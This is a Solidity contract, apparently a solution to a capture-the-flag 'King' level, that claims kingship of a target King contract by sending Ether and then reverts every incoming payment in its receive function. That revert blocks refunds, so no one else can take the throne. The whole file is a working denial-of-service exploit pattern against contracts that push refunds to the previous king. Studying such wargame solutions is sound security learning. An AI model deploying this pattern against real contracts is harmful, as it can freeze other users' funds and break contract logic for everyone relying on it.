// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/King.sol";

contract KingAttacker {
    King king;

    constructor(address payable _king) {
        king = King(_king);
    }

    // send money and reclamain the king position
    function claim() public payable {
        (bool sent, ) = payable(king).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    // receive fallback that only reverts
    receive() external payable {
        revert("troslei!");
    }
}
